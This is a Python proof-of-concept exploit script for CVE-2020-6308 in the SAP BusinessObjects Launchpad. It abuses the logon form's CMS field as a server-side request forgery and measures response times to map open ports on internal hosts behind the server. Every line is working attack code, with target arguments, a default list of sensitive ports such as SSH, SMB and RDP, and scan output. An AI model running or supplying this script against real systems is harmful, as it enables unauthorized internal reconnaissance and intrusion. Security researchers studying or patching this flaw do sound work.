#!/usr/bin/env python3
# Customized - SAP BusinessObjects Launchpad SSRF & Timing Attack PoC // https://github.com/MachadoOtto/sap_bo_launchpad-ssrf-timing_attack/blob/main/sap_bo_launchpad-ssrf-timing_attack.py
# @pandujar

import urllib.request
import urllib.parse
from datetime import datetime
import sys
from termcolor import colored

# Define colors for output
GREEN = lambda text: colored(text, 'green')
RED = lambda text: colored(text, 'red')
YELLOW = lambda text: colored(text, 'yellow')

# Validate arguments
if len(sys.argv) < 3:
    print("Usage: CVE-2020-6308.py <affected_url> <targetIP> [targetPorts]")
# Ex: python3 CVE-2020-6308.py https://target/BOE/portal/2210191839/InfoView/logon.faces SAP-ANALYTICS 22,23,135,443,445,1337,2103,2105,3389,8005,21,6400
    sys.exit(1)

affected_url = sys.argv[1]
targetIP = sys.argv[2]
defaultPorts = [22, 23, 135, 443, 445, 1337, 2103, 2105, 2107, 2638, 3389, 8005, 31337]
targetPorts = list(map(int, sys.argv[3].split(','))) if len(sys.argv) >= 4 else defaultPorts
headers = {'User-Agent': 'X-Cobalt-Prometheus/1.0 SAP BusinessObjects Launchpad SSRF'}
first_iter = True

# Connect to SAP BusinessObjects
try:
    request = urllib.request.Request(affected_url, headers=headers)
    page = urllib.request.urlopen(request)
    if first_iter:
        print(YELLOW(f"[*] Connected to SAP BusinessObject {affected_url}"))
        first_iter = False
except Exception as e:
    print(RED(f"[-] Error connecting to SAP BusinessObject {affected_url}: {e}"))
    sys.exit(2)

resheaders = page.info()
cookie = resheaders.get('Set-Cookie', '')
content = page.readlines()

sfview = None
for line in content:
    if b"com.sun.faces.VIEW" in line:
        sfview = line.decode().split("=")[4].split("\"")[1]
        print(YELLOW("[*] Retrieved dynamic Java Faces value"))
        break

if not sfview:
    print(RED("[-] Failed to retrieve dynamic Java Faces value. Are you sure the URL is correct?"))
    sys.exit(3)

# Port scanning
for port in targetPorts:
    formdata = {
        "_id0:logon:CMS": f"{targetIP}:{port}",
        "_id0:logon:USERNAME": "",
        "_id0:logon:PASSWORD": "",
        "com.sun.faces.VIEW": sfview,
        "_id0": "_id0"
    }
    data_encode = urllib.parse.urlencode(formdata).encode()

    start = datetime.now()
    print(YELLOW(f"[*] Testing timing attack on {targetIP}:{port}..."))

    try:
        request = urllib.request.Request(affected_url, data=data_encode)
        request.add_header('Cookie', cookie)
        response = urllib.request.urlopen(request)
        end = datetime.now()
        the_page = response.read().decode()
    except Exception as e:
        print(RED(f"[-] Error testing port {port}: {e}"))
        continue

    elapsedTime = (end - start).total_seconds()

    if "FWM" in the_page:
        if elapsedTime >= 10:
            print(GREEN(f"[✔] Port {port} is OPEN! (Time: {elapsedTime:.2f}s)"))
        else:
            print(RED(f"[✘] Port {port} is CLOSED (Time: {elapsedTime:.2f}s)"))
    elif "FWB" in the_page:
        print(GREEN(f"[*] Host {targetIP}:{port} is a valid CMS, but credentials are incorrect."))
    elif "FWC" in the_page:
        print(RED("[-] Error: login session expired."))
        sys.exit(10)

print(YELLOW("[*] Scan completed."))
